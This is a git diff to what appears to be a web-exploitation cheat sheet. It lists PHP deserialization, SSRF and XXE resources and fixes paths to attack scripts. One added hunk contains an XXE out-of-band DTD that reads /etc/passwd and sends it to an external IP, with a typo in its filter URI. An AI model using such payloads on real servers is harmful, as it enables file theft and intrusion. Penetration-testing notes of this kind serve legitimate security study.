@@ -126,7 +126,7 @@ https://hackvertor.co.uk/public
 
 ### PHP Obfuscation - base64+gzdeflate
 
-/codes/obufscation/obfuscation.php
+codes/obufscation/obfuscation.php
 
 ### Response - Status code WAF'S
 
@@ -381,7 +381,7 @@ Ex:
   
 O:4:"Okay":1:{s:14:"' . "\0" . 'Okay' . "\0" . 'filepath";s:11:"/tmp/ok.txt";}
 
-codes/deserialization_php/class.php
+codes/deserialization/example.php
   
 #### Trick Bypass
 
@@ -435,7 +435,7 @@ https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payload
   
 ### Script
   
-/code/deserialization/java/gserial.sh
+codes/deserialization/java/gserial.sh
   
 codes/deserialization/java/payload.txt
   
@@ -615,7 +615,13 @@ https://datatracker.ietf.org/doc/html/rfc1436
 Gopherus
 
 https://github.com/tarunkant/Gopherus
+  
+### Scripts
 
+codes/ssrf_protocol_smuggling/zabbix.py
+  
+codes/ssrf_protocol_smuggling/memcached.py
+  
 ### Doc for SSRF - bhack
 
 https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf
@@ -635,5 +641,10 @@ https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploi
 >
 
 -> Part 2
-
+  
 vulns/xxe_oob/evil.dtd
+  
+<!ENTITY % file SYSTEM "php>://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % payload "<!ENTITY &#37; remote SYSTEM 'http://10.10.12.228/?leak=%file;'>">
+%payload;
+%remote;
